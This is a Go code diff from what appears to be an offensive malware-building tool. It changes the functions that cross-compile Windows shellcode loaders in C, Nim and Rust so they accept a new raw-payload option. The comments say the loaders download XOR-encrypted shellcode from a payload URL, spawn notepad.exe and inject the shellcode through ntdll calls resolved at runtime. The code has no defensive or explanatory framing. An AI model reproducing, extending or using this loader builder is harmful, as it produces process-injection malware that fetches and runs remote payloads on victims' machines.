@@ -1245,7 +1245,7 @@ func BuildLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string,
 // BuildCLoader cross-compiles the C WinHTTP shellcode loader for Windows x64.
 // It invokes x86_64-w64-mingw32-gcc with -DPayloadURL and -DXORKey so the
 // constants are baked in at compile time. The resulting .exe is written to outDir.
-func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
+func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string, rawPayload ...bool) (string, error) {
 	cc := "x86_64-w64-mingw32-gcc"
 	if _, err := exec.LookPath(cc); err != nil {
 		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
@@ -1264,6 +1264,7 @@ func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string
 
 	outPath := filepath.Join(outDir, resolveOutName(cfg, "loader_c_amd64.exe"))
 
+	isRaw := len(rawPayload) > 0 && rawPayload[0]
 	args := []string{
 		"-Os", "-s", "-mwindows",
 		"-Wall", "-Wno-unused-parameter",
@@ -1272,6 +1273,9 @@ func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string
 		"-o", outPath,
 		srcPath,
 		"-lwinhttp", "-lkernel32",
+	}
+	if isRaw {
+		args = append(args, "-DRAW_PAYLOAD")
 	}
 
 	cmd := exec.Command(cc, args...)
@@ -1326,7 +1330,7 @@ func BuildCStager(stageURL, outDir string) (string, error) {
 // payloadURL is the HTTP/HTTPS URL serving the XOR-encrypted shellcode.
 // xorKeyHex is the key as a hex string (e.g. "aabbccdd11223344").
 // Returns the absolute path to the compiled loader_nim.exe.
-func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
+func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string, rawPayload ...bool) (string, error) {
 	nim, err := findNim()
 	if err != nil {
 		return "", err
@@ -1345,6 +1349,7 @@ func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (stri
 	outName := resolveOutName(cfg, "loader_nim.exe")
 	outPath := filepath.Join(outDir, outName)
 
+	isRawNim := len(rawPayload) > 0 && rawPayload[0]
 	args := []string{
 		"c",
 		"-d:mingw",
@@ -1361,6 +1366,9 @@ func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (stri
 		fmt.Sprintf("-d:xorKey=%s", xorKeyHex),
 		fmt.Sprintf("--out:%s", outPath),
 		"loader.nim",
+	}
+	if isRawNim {
+		args = append(args, "-d:rawPayload")
 	}
 
 	cmd := exec.Command(nim, args...)
@@ -1382,7 +1390,7 @@ func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (stri
 // BuildRustLoader cross-compiles the Rust WinHTTP shellcode loader for Windows x64.
 // Identical pattern to BuildCLoader/BuildNimLoader: XOR-only, no compression,
 // spawns notepad.exe and injects via ntdll functions resolved at runtime.
-func BuildRustLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
+func BuildRustLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string, rawPayload ...bool) (string, error) {
 	cargo, err := findCargo()
 	if err != nil {
 		return "", err
@@ -1407,7 +1415,16 @@ func BuildRustLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (str
 	outPath := filepath.Join(outDir, outName)
 
 	buildDir := filepath.Join(loaderDir, "target", "x86_64-pc-windows-gnu", "release")
-	cmd := exec.Command(cargo, "build", "--release", "--target", "x86_64-pc-windows-gnu")
+	isRawRust := len(rawPayload) > 0 && rawPayload[0]
+	rustFeatures := ""
+	if isRawRust {
+		rustFeatures = "raw_payload"
+	}
+	cargoArgs := []string{"build", "--release", "--target", "x86_64-pc-windows-gnu"}
+	if rustFeatures != "" {
+		cargoArgs = append(cargoArgs, "--features", rustFeatures)
+	}
+	cmd := exec.Command(cargo, cargoArgs...)
 	cmd.Dir = loaderDir
 	cmd.Env = append(os.Environ(),
 		"PAYLOAD_URL="+payloadURL,
